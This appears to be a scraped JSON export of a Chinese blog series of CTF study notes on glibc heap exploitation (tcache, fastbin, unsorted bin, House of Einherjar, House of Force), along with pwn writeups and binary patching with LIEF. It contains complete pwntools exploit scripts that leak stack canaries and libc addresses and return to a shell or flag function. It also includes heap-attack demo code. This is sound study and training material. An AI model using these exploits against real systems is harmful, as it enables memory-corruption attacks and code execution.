这样，下一次分配出来的地址，就是目标地址了（可能有一点出入，因为对齐的缘故）。 1234567891011 RAX 0x601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7ffff7a91130 (malloc) ◂— push rbp RBX 0x0 RCX 0x7ffff7dd1b20 (main_arena) ◂— 0x100000000 ...───────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────── ... 0x40055c &lt;main+54&gt; call malloc@plt &lt;0x400410&gt; ► 0x400561 &lt;main+59&gt; mov qword ptr [rbp - 8], rax &lt;0x601020&gt; 0x400565 &lt;main+63&gt; mov eax, 0 ... 可以看到分配出来的chunk已经是0x601020了，这样就能修改malloc@got.plt了。 利用House of Force，不仅可以放低top chunk，也可以太抬高，只是计算的偏移有所不同而已。 题目[咕咕咕]","path":"2019/07/22/day6_houseofforce/","date":"07-22","excerpt":"先把知识点刷完，然后做题练习，加油orz"},{"title":"Day5 - House of Einherjar","text":"House of Einherjar这个技术可以强制使得malloc返回一个几乎任意地址的chunk。其主要在于滥用free中的后向合并操作（合并低地址的chunk），这样可以避免碎片化。 在一些特殊大小的堆块中，off by one不仅可以修改下一个堆块的prev_size，还可以修改下一个堆块的PREV_INUSE位。 参考 CTF wiki 原理后向合并操作 free函数中的后向合并核心操作如下 1234567/* consolidate backward */if (!prev_inuse(p)) &#123; prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);&#125; 两个物理相邻的chunk会共享prev_size字段，当低地址的chunk处于使用状态时，相邻的高地址chunk的该字段便可以被低地址的chunk使用。因此，我们阔以通过写低地址chunk来覆盖高地址chunk的prev_size字段 一个chunk的PREV_INUSE位标记了其物理相邻的低地址chunk的使用状态 后向合并时，新的chunk位置取决于chunk_at_offset(p, -((long) prevsize))。 这样的话，如果我们控制一个chunk的prev_size和PREV_INUSE字段，那么我们就能将新的chunk指向几乎任何位置。 利用利用主要需要注意: 需要在目的位置构造好fake chunk，而且要绕过unlink的检查 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); 可以让FD = p，BK = p。这样FD-&gt;bk == p而且BK-&gt;fd == p。 unlink还有一个检查是检查fake chunk的大小 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); 对fake chunk的size和prev_size的验证只有在unlink里验证，这样只要保证fake chunk的next chunk的prev_size跟fake chunk的size相同就行。 总结： 需要可以有写物理相邻高地址的prev_size和PREV_INUSE部分 需要计算目的chunk与p1地址之间的差值，所以需要泄露地址 要在目的chunk附近构造相应fake chunk，用来绕过unlink检测 栗子2016 Seccon tinypad首先康康保护 12345678$ checksec tinypad [!] Couldn't find relocations against PLT to get symbols[*] '/home/critiz/Desktop/tinypad' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE","path":"2019/07/21/day5_houseofeinherjar/","date":"07-21","excerpt":"House of Einherjar这个技术可以强制使得malloc返回一个几乎任意地址的chunk。其主要在于滥用free中的后向合并操作（合并低地址的chunk），这样可以避免碎片化。 在一些特殊大小的堆块中，off by one不仅可以修改下一个堆块的prev_size，还可以修改下一个堆块的PREV_INUSE位。"},{"title":"Day4 - Unsorted Bin Attack","text":"写着写着发现好像不过是每日新坑orz，之前的都没怎么写完，还得留着后边填坑。。。 至少先熟悉这些利用方式，后边再补充好了。。。 参考 CTF wiki Unsorted Bin Attack 被利用的前提是控制Unsorted Bin Chunk 的 bk 指针。可以达到的效果是实现修改任意地址值为一个较大的数值。 Unsorted Bin来源1、当一个较大的chunk被分割为两部分的时候，如果剩下的部分大于MINSIZE，就会被放到unsorted bin中。 2、释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被首先放到unsorted bin中。 3、当进行malloc_consolidate时，可能会把合并后的chunk放到unsorted bin中（如果不和top chunk紧邻的话）。 使用1、unsorted bin在使用过程中，采用的顺序遍历时FIFO，即先入先出。 2、在程序malloc时，如果在fastbin。small bin中找不到对应大小的chunk，将会尝试从unsorted bin中寻找chunk。如果取出来的chunk大小刚好满足，就会直接返回给用户，否则就会把这些chunk分别插入到对应的chunk中。 原理在_init_malloc中这么一段代码，当将一个unsorted bin取出时，会将bck-&gt;fd的位置写入本Unsorted bin的位置。 12345/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (\"malloc(): corrupted unsorted chunks 3\");unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av); 即如果控制了bk的值，我们就能将unsorted_chunks(av)写到任意地址。 栗子借助sellphish的unsorted_bin_attack.c 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\\n\"); fprintf(stderr, \"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack\\n\\n\"); unsigned long stack_var=0; fprintf(stderr, \"Let's first look at the target we want to rewrite on stack:\\n\"); fprintf(stderr, \"%p: %ld\\n\\n\", &amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr, \"Now, we allocate first normal chunk on the heap at: %p\\n\",p); fprintf(stderr, \"And allocate another normal chunk in order to avoid consolidating the top chunk with\" \"the first one during the free()\\n\\n\"); malloc(500); free(p); fprintf(stderr, \"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer \" \"point to %p\\n\",(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(&amp;stack_var-2); fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\"); fprintf(stderr, \"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\\n\\n\",(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr, \"Let's malloc again to get the chunk we just free. During this time, the target should have already been \" \"rewritten:\\n\"); fprintf(stderr, \"%p: %p\\n\", &amp;stack_var, (void*)stack_var);&#125; 运行结果如下 12345678910111213141516$./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stackIn practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attackLet's first look at the target we want to rewrite on stack:0x7ffc24962c78: 0Now, we allocate first normal chunk on the heap at: 0xdc6010And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f76026f6b78Now emulating a vulnerability that can overwrite the victim-&gt;bk pointerAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffc24962c68Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:0x7ffc24962c78: 0x7f76026f6b78 然后通过gdb调试看看。 在第一次分配malloc(400)之后 1234567891011121314151617pwndbg&gt; heap0x602000 PREV_INUSE &#123; prev_size = 0x0, size = 0x1a1, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x6021a0 PREV_INUSE &#123; prev_size = 0x0, size = 0x20e61, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 然后分配malloc(500)防止释放的时候被合并到top chunk中。 在free(p)之后 1234567891011121314pwndbg&gt; heap0x602000 PREV_INUSE &#123; prev_size = 0x0, size = 0x1a1, fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;...pwndbg&gt; binsunsortedbinall: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b78... 此时该chunk的fd和bk都指向同样main_arena+88的位置 在修改chunk的bk指针之后，指向栈上的地址-0x10处（32位为-0x8） 123456789pwndbg&gt; heap0x602000 PREV_INUSE &#123; prev_size = 0x0, size = 0x1a1, fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, bk = 0x7fffffffdcc8, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 在malloc之前，栈上地址（0x7fffffffdcd8）处的值为0 123456700:0000│ rsp 0x7fffffffdcd0 —▸ 0x400890 (__libc_csu_init) ◂— push r1501:0008│ 0x7fffffffdcd8 ◂— 0x002:0010│ 0x7fffffffdce0 —▸ 0x602010 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6023a0 ◂— 0x003:0018│ 0x7fffffffdce8 ◂— 0xd0c603714908080004:0020│ rbp 0x7fffffffdcf0 —▸ 0x400890 (__libc_csu_init) ◂— push r1505:0028│ 0x7fffffffdcf8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax06:0030│ 0x7fffffffdd00 ◂— 0x0 在malloc(400)之后，栈上的地址写入了main_arena+88的值 123456700:0000│ rsp 0x7fffffffdcd0 —▸ 0x400890 (__libc_csu_init) ◂— push r1501:0008│ 0x7fffffffdcd8 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6023a0 ◂— 0x002:0010│ 0x7fffffffdce0 —▸ 0x602010 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6023a0 ◂— 0x003:0018│ 0x7fffffffdce8 ◂— 0xd0c603714908080004:0020│ rbp 0x7fffffffdcf0 —▸ 0x400890 (__libc_csu_init) ◂— push r1505:0028│ 0x7fffffffdcf8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax06:0030│ 0x7fffffffdd00 ◂— 0x0 在最后一次malloc的时候，所申请的chunk大小在unsorted bin所在的范围，就去unsorted bin内查找，找到以后返回，执行以下操作 12345678910111213141516171819202122232425while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123; bck = victim-&gt;bk; if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0)) malloc_printerr(check_action, \"malloc(): memory corruption\", chunk2mem(victim), av); size = chunksize(victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* 显然，bck被修改，并不符合这里的要求*/ if (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; .... &#125; /* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av); victim = unsorted_chunks(av)-&gt;bk = p bck = victim-&gt;bk = p-&gt;bk = target addr - 0x10 unsorted_chunks(av)-&gt;bk = bck = target addr - 0x10 bck-&gt;fd = *(target addr - 0x10 + 0x10) = unsorted_chunks(av) 可以看出，在将unsorted bin的最后一个chunk拿出来的过程中，victim的fd并没有发挥作用，所以即使修改掉也没有关系。但是，unsorted bin链表可能就此破坏，在插入chunk时，可能会出现问题。 这样可以使得我们可以通过这，将目标地址的值改成一个比较大的值，但是这个值不受我们的控制。这个在某些时候还是很有用的，比如说： 通过修改循环次数，达到多次循环 通过修改heap中的的 global_max_fast来使得更大的chunk可以被视为fast bin，这样我们可以执行一些fast bin attack了。 一些例子HITCON Training lab14 magic heap查看一下保护 1234567$ checksec magicheap [*] '/home/critiz/Desktop/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序逻辑很简单 创建堆，给定堆的大小，大小没有限制，数量有限制 删除堆，会清空指针 修改堆，漏洞在这里，修改的大小是自己输入的，所以有堆溢出漏洞 输入4869，这时比较magic的值和0x1305的大小，如果大于，那么就能获得flag。 思路就很简单，释放一个chunk到unsorted bin中，然后通过堆溢出修改该chunk的fd值为&amp;magic exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env pythonfrom pwn import *import sysif len(sys.argv) == 1: p = process('./magicheap')else: p = process('./magicheap') gdb.attach(p)def create(size, content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of Heap : ') p.sendline(str(size)) p.recvuntil('Content of heap:') p.sendline(content) p.recvuntil('SuccessFul')def edit(index, size, content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index)) p.recvuntil('Size of Heap : ') p.sendline(str(size)) p.recvuntil('Content of heap : ') p.sendline(content) p.recvuntil('Done !')def delete(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index)) p.recvuntil('Done !')def l33t(): p.recvuntil('Your choice :') p.sendline('4869')create(32, 'a')create(400,'a')create(500,'a')tar_addr = 0x6020C0delete(1)payload = 'a'*32 + p64(32+16) + p64(400+16+1) + p64(0x0) + p64(tar_addr - 0x10)edit(0,len(payload),payload)create(400,'a')l33t()p.interactive() 2016 0CTF zerostorange看看保护 12345678$ checksec zerostorage [*] '/home/critiz/Desktop/zerostorage' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 嗯，看来保护都开了23333 分析一下功能，主要有插入、修改、合并、删除、展示和列举： 插入，如果不到32个记录，那就再插入一个记录，记录的格式是这样 12345struct record&#123; QWORD flag; //当前记录是否被占用（1-被占用，0-为占用） QWORD size; //保存当前记录的大小 QWORD ptr; //指向记录的指针&#125; malloc分配的大小限制再128-4096的范围内，但是size保存的是输入的大小 修改，根据index和输入的大小判断是否重新分配一块内存保存新的内容 合并，合并两个记录到新的记录上去，删掉原来两个记录，并清零指针，但是chunk2的没有被释放，并且没有检查两个index是否相同 删除，删除记录，并且清零指针 展示，根据index展示记录内容 列举，列举每个有效记录的序号和大小","path":"2019/07/20/day4_unsortedbin_attack/","date":"07-20","excerpt":"写着写着发现好像不过是每日新坑orz，之前的都没怎么写完，还得留着后边填坑。。。 至少先熟悉这些利用方式，后边再补充好了。。。"},{"title":"Day3 - Fastbin Attack","text":"今天第四天啦，继续加油orz。这几天先把几种基本的堆的利用方式学学吧。 参考资料 CTF Wiki Fastbin Attack是基于fastbin的一类漏洞利用的方法，这些利用有一些前提： 有堆溢出，uaf等漏洞，可以控制chunk内容 漏洞发生在fastbin类型的chunk之中 漏洞主要原理在于Fastbin是通过单链表管理的，并且释放fastbin的chunk的时候不会清空next chunk的pre_in_use位。 Fastbin Double FreeFastbin Double Free是指fastbin的chunk可以被多次释放，导致同一个chunk可以在fastbin链表中多次存在。这样分配的时候就可以实现多个指针指向同一个堆块，这样，根据不同指针对于堆块内容的用处不用，就能实现类型混淆的效果 这个方法可以成功有两个原因： 堆块被释放后没用清空next chunk的pre_in_use位 fastbin在进行free的时候只检查main_arena直接指向的块，对于之后的块并没有检查。 1234567891011int main(void)&#123; void *chunk1, *chunk2; chunk1 = malloc(0x10); chunk2 = malloc(0x10); free(chunk1); free(chunk2); free(chunk1); return 0;&#125; free(chunk1) 123+--------------+ +----------+| main_arena | ---&gt; | chunk1 |+--------------+ +----------+ free(chunk2) 123+--------------+ +----------+ +----------+| main_arena | ---&gt; | chunk2 | ---&gt; | chunk1 |+--------------+ +----------+ +----------+ free(chunk3) 1234+--------------+ +----------+ +----------+ +----------+| main_arena | ---&gt; | chunk1 | ---&gt; | chunk2 | ---&gt; | chunk1 |----+--------------+ +----------+ +----------+ +----------+ | ^--------------------------------| 这样free在第三次释放后fd的值不为0而是指向chunk2 如果在这时，我们能够控制chunk1的内容，就可以改写fd从而在我们想要的的地址分配fastbin块（要注意大小必须和该fastbin链表的大小一致）。从而实现任意地址写。 House Of Spirit这个就是通过控制目标区域前后的内容，伪造一个假的chunk，然后将这块内存释放掉，再分配回来，就能控制目标区域的内容了。 要注意一些检测 fake chunk的ISMMAP位不能位1，因为会被特殊处理 fake chunk的地址要对齐，MALLOC_ALIGN_MASK fake chunk的大小要满足对应fastbin的需求 fake chunk的next chunk大小不能小于2*SIZE_SZ，同时也不能大于av-&gt;system_mem fake chunk对用的fastbin链表头部不能使该fake chunk（不能double free） 具体利用之前写过了，下次复习orz Alloc to Stack这个比较好理解 通过在栈上伪造fake chunk，然后通过修改在fastbin链表中的chunk的fd指针指向fake chunk，就能把栈上的fake chunk分配出来，然后控制一些关键数据。注意栈上的fakechunk需要又满足条件的size值。 Arbitrary Alloc这个跟上一个一样，只是不局限在栈上，任何满足条件的size域，都可以成为被分配的块。 可以使用字节错位来寻找满足条件的size，然后在fastbin构造一个相同组的chunk，通过修改该chunk的fd，就能分配到该目标块了。 栗子Search Engine首先康康保护 12345678$ checksec search [*] '/home/critiz/Desktop/search' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE FORTIFY: Enabled","path":"2019/07/19/day3_fastbin_attack/","date":"07-19","excerpt":"今天第四天啦，继续加油orz。这几天先把几种基本的堆的利用方式学学吧。"},{"title":"Day2 - 一些pwn题","text":"今天打算写点题，没得指导下写题才能清楚知道自己水平orz 平台： 攻防世界 babystack先看看保护 1234567$ checksec babystack [*] '/home/critiz/Desktop/babystack' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 然后ida打开分析。 程序流程很简单，就是对给定的缓冲区进行输入和输出。然后有栈溢出漏洞。 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax char s; // [rsp+10h] [rbp-90h] unsigned __int64 v6; // [rsp+98h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(&amp;s, 0, 0x80uLL); while ( 1 ) &#123; menu(); v3 = get_number(); switch ( v3 ) &#123; case 2: puts(&amp;s); break; case 3: return 0LL; case 1: read(0, &amp;s, 0x100uLL); break; default: pputs(\"invalid choice\"); break; &#125; pputs((const char *)&amp;unk_400AE7); &#125;&#125; 很显然，缓冲区只有0x90大小，但是可以输入0x100个字节，而我一开始脑子不清醒，以为只能溢出0x10个字节。。。再考虑了构造fake frame无果（不知道可不可以。。。没想出来orz）。然后发现这好像不止0x10个字节= = 知道溢出字节足够的情况下确实就很简单了，大致思路如下： 由于程序开了canary，所以要先泄露canary 覆盖返回地址到puts函数上，泄露库函数的地址，然后计算one gadget的地址 程序再次执行，将返回地址修改成one gadget地址 在写的过程中，由于选择了功能后是直接输入，输入是由read函数完成的，就会导致下一次的输入会输入到上一次输入的缓冲区里，这样就导致输入乱套orz。解决办法比如在第一次输入以后sleep(1)，这样就能隔开，或者在输入选择的时候，用\\x00字节将缓冲区填满。这两个方式怎么选。。。那当然是我全都要orz 还有就是在泄露库函数的时候，由于程序是64位的，所以前6个参数是通过寄存器传递的（在这里调试好久，太菜了orz），可以借助ROPgadget找到合适的指令来完成修改寄存器值 123456789101112131415161718$ ROPgadget --binary babystack --only 'pop|ret'Gadgets information============================================================0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a90 : pop r14 ; pop r15 ; ret0x0000000000400a92 : pop r15 ; ret0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400778 : pop rbp ; ret0x0000000000400a93 : pop rdi ; ret0x0000000000400a91 : pop rsi ; pop r15 ; ret0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040067e : ret0x0000000000400288 : ret 0x6c1f0x0000000000400811 : ret 0x8b48Unique gadgets found: 13 0x400a93刚好就合适。 exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import LibcSearcherimport sysif len(sys.argv) == 1: p = process('./babystack')elif sys.argv[1] == 'g': p = process('./babystack') gdb.attach(p)#, 'b *0x400908\\nc')else: p = remote('111.198.29.45',38956)libc = ELF('./libc-2.23.so')elf = ELF('./babystack')def pad(i): return i.ljust(0x1f,'\\x00')# get the canaryp.recvuntil('&gt;&gt; ')p.sendline(pad('1'))sleep(1)payload = 'a'*0x88p.sendline(payload)p.recvuntil('&gt;&gt; ')p.sendline(pad('2'))p.recvuntil('\\n')canary = u64(p.recv(7).rjust(8,'\\x00'))log.info('canary '+hex(canary))# get the libc basep.recvuntil('&gt;&gt; ')p.sendline(pad('1'))sleep(1)puts_got = elf.got['puts']puts_plt = elf.plt['puts']main_addr = 0x400908pop_rdi_ret = 0x400a93payload = '\\x00'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(puts_got)payload += p64(puts_plt) + p64(main_addr)p.sendline(payload)p.recvuntil('&gt;&gt; ')p.sendline('3')puts_addr = u64(p.recv(6).ljust(8,'\\x00'))log.info('puts addr '+hex(puts_addr))# get shellone_gadget = 0x45216 # 0x45216 0x4526a 0xf02a4 0xf1147libc_base = puts_addr - libc.symbols['puts']tar_addr = libc_base +one_gadgetp.recvuntil('&gt;&gt; ')p.sendline(pad('1'))payload = '\\x00'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(tar_addr)p.sendline(payload)p.recvuntil('&gt;&gt; ')p.sendline(pad('3'))p.interactive() mary_morton先看保护 1234567$ checksec mary_morton [*] '/home/critiz/Desktop/mary_morton' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 这个题目就很善良2333可以选择两种漏洞，一个是栈溢出，一个是格式化字符串。而且还给了获取flag的函数 1234int target_4008DA()&#123; return system(\"/bin/cat ./flag\");&#125; 程序利用思路也比较直白： 由于程序开了canary保护，通过格式化字符串漏洞，可以泄露canary的值 得到canary后，直接通过栈溢出，将返回地址该成target函数地址 这个也没什么坑，exp如下： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *DEBUG = 1if DEBUG == 1: p = process('./mary_morton') #gdb.attach(p)else: p = remote('111.198.29.45',30020)tar_addr = 0x4008DAp.recvuntil('3. Exit the battle \\n')p.sendline('2')payload = '0x%23$llx'p.sendline(payload)#p.recvuntil('\\n')canary = int(p.recvuntil('\\n')[:-1],16)log.info(hex(canary))p.sendline('1')payload = 'b'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(tar_addr)p.sendline(payload)p.interactive() monkey这个题，emmm由于命令行有os.system()这个函数调用，所以直接get shell就可以了。。。 第一次做这种类型的pwn题，完全摸不着头脑orz","path":"2019/07/18/day2_exercise/","date":"07-18","excerpt":"今天打算写点题，没得指导下写题才能清楚知道自己水平orz"},{"title":"Day1 - Patch","text":"在国赛半决赛中出现过的要求，就是修补漏洞，但是不能对原文件改动太大，不然过不了check。然后昨天看到今年国赛的决赛赛制，是awd。似乎是一队维护&gt;=10个gamebox额，第一次打awd，听起来想放弃23333不如删掉flag文件算了，或者关机orz还是学学吧2333 IDA对于缓冲区溢出的漏洞，可以使用IDA。啊，这个魅力无处安放的女人。 比如缓冲区大小比可读入的字节小，这时候就可以直接使用IDA，在对应的汇编指令处修改读入的字节数。然后应用到原文件中，这样改动不大也能完成修补，就很简便。 [此处应有例子] LIEF一个开源的跨平台库，可以解析、修改和抽象ELF、PE和MachO格式 安装12pip install setuptools --upgradepip install lief 使用LIEF增加段源代码（64位） 12345678910//vuln.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; printf(\"/bin/sh\"); puts(\"a test\"); return 0;&#125; 目的是将printf修改成自己的函数 首先编写自己的函数 使用gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared func.c -o hook编译 12345678910111213141516171819//func.c __asm( \"mov $0x0, %rdx\\n\" \"mov $0x0, %rsi\\n\" \"mov $0x3b,%rax\\n\" \"syscall\\n\" );&#125;void my_printf(char *a)&#123; asm( \"mov %rdi,%rsi\\n\" \"mov $0,%rdi\\n\" \"mov $0x20,%rdx\\n\" \"mov $0x1,%rax\\n\" \"syscall\\n\" );&#125; 方式一，修改got表然后使用LIEF注入到文件中 123456789101112131415#!/usr/bin/env python3#-*- coding:utf-8 -*-import liefbinary = lief.parse('./vuln')hook = lief.parse('./hook')segment_added = binary.add(hook.segments[0])my_printf = hook.get_symbol('myprintf')my_printf_addr = segment_added.virtual_address + my_printf.valuebinary.patch_pltgot('printf', my_printf_addr)binary.write('vunl.patd') 然后执行注入后的程序 但是两个文件大小相差很大。。。 方式二，修改指定位置的call函数使用以下脚本可以修改指定位置的call函数 123456789101112131415161718192021222324252627#!/usr/bin/env python3#-*- coding:utf-8 -*-import lieffrom pwn import *binary = lief.parse('./vuln')hook = lief.parse('./hook')segment_added = binary.add(hook.segments[0])my_printf = hook.get_symbol('myprintf')my_printf_addr = segment_added.virtual_address + my_printf.value#binary.patch_pltgot('printf', my_printf_addr)def patch_call(file, sour, dist, arch = \"amd64\"): print(hex(dist)) length = p32((dist - (sour + 5 )) &amp; 0xffffffff) order = b'\\xe8'+length print(disasm(order,arch=arch)) file.patch_address(sour ,[i for i in order])tar_addr = 0x400574patch_call(binary,tar_addr,my_printf_addr)binary.write('vuln.patched') 修改.eh_frame段这个段本身有可执行权限，而且本身作用不大（貌似跟处理异常相关）。这样可以将代码写在这个部分，然后程序变化也不会很大。 就可以直接将hook函数中的代码写到eh_frame段中去，然后修改call的跳转，完成patch 12345678bin_frame = binary.get_section('.eh_frame')hook_text = hook.get_section('.text')bin_frame.content = hook_text.contentdisaddr = bin_frame.virtual_addresstaraddr = 0x400574patch_call(binary, taraddr, disaddr) 这样就能直接跳转过来了 参考链接 P4nda e3pem","path":"2019/07/17/day1_patch/","date":"07-17","excerpt":"在国赛半决赛中出现过的要求，就是修补漏洞，但是不能对原文件改动太大，不然过不了check。然后昨天看到今年国赛的决赛赛制，是awd。似乎是一队维护&gt;=10个gamebox额，第一次打awd，听起来想放弃23333不如删掉flag文件算了，或者关机orz还是学学吧2333"},{"title":"Day 0 - tcache","text":"嘛，本来是暑假一开始就准备的企划orz，然后短学期之前的部分没记录23333。整个记录顺便防止自己整日荒废然后比赛暴毙orz。这个系列都是堆相关的漏洞利用，主要参考资料是ctf-wiki，以及询问大佬。。。哈吉马路哟 参考资料 ctf-wiki TCACHEtcache是glibc2.26以后新加入的机制。从名字来看是一个类似内存的cache那样的加速的东西。系统为每个线程增加bin缓存，默认情况下，每个线程有64个bins，大小从24（32位下12），以16（32位下8）递增至1032（32位下516）。每个bins默认最多容纳7个chunk。 tcache对chunk的检查很少，难怪wiki上有一句“tcache makes heap exploitation easy again”。 将chunk放入tcache 在放入chunk时，free函数检查对其和前后堆块释放情况，然后优先将chunk放入tcache中。 在malloc中，也有将内存块放入tcache的情况： 如果申请的是fastbin大小的块并且在fastbin内找到可用的块时，会将该链上的其他内存块放入tcache中 如果申请的是smallbin大小的块并且在smallbin在找到可用的块时，将该链上的其他内存块放入tcache中 如果是处理unsorted bin，那么当找到一个大小合适的块时，会将其放入tcache中，然后继续寻找，而不是直接返回。 从tcache中取出chunk 在malloc时，如果tcache中有大小合适的chunk，从tcache中获取 遍历完unsorted bin之后，如果tcache中有大小合适的chunk，从tcache中获取 在循环处理unsorted bin内存块时，如果达到放入tcache的unsorted bin上限时，会直接返回。但是一般默认是0（没有上限） 利用方式tcache poisoning因为tcache检查很松，可以通过覆盖rcache的next，不需要构造任何chunk即可实现malloc到任何地址 tcache dup类似fastbin dup，由于检查几乎没有，所以可以多次free同一个chunk。 tcache house of spirit通过控制栈上的内容，在栈上布置fake chunk，然后free掉，这样可以通过malloc得到一块栈上的空间。 smallbin unlink在smallbin中包含空闲块时，会同时将同大小的其他空闲块放入tcache中，此时会出现解链操作。但是相比于unlink宏，缺少链的完整性校验。原本的unlink操作在该条件下也能使用。 libc leak需要先将tcache填满，再进行libc leak。 overlapping chunk更改指定chunk的size，使之增大。那么在释放再分配时就能造成堆块交叉。 应用例子待填orz 之前的堆块利用方式还没看完。。。学完再填","path":"2019/07/16/day0_tcache/","date":"07-16","excerpt":"嘛，本来是暑假一开始就准备的企划orz，然后短学期之前的部分没记录23333。整个记录顺便防止自己整日荒废然后比赛暴毙orz。这个系列都是堆相关的漏洞利用，主要参考资料是ctf-wiki，以及询问大佬。。。哈吉马路哟"},{"title":"CISCN2019线上re","text":"可以说，ciscn是我至今为数不多能做出题的比赛了23333菜的真实 0x00 easyGO看名字是go语言和题目，用ida打开看看，wdm这函数数量，怕了怕了。首先运行，然后ida搜索字符串，通过交叉引用，找到主要逻辑，简单分析了一下发现还是有点复杂，还是上手gdb调试看看。 设置断点在提示输入的地方，然后开始运行。发现输入后过了不久，程序就取出一长串字符串。 猜测可能是目标字符串，需要与之进行比对。继续调试。 在经过函数0x47e620这个函数之后，flag已经解出来了。 0x01 bbvvmm文件使用ida打开，发现主要逻辑还是挺明显的。输入用户名和密码，分别校验，对了就能登陆拿到flag，是有远程环境的。 用户名 通过逆运算，sub_400AA6是个换了表的BASE64加密，通过写解密代码，解得正确的v33应该为“EF468DBAF985B2509C9E200CF3525AB6”。 然后观察到sub_401738函数的参数都与输入无关，且v10要作为sub_4018C4的输入，则通过调试，直接得到v10的值为： 然后对于函数sub_4018c4，除了v13以外所有的参数都已知，所以可以推断出v13 的值。查看这个函数 通过分析，这个函数中只有sub_201362起作用，循环只经历了一次，相当于只进行了一次sub_201362操作。 目前已知v5，这样可以知道v14,v13,v12,v11的值，while循环的初值是s,v8,v9,v10，循环中函数是异或操作，于是我们可以通过反推得到函数的输入v3。 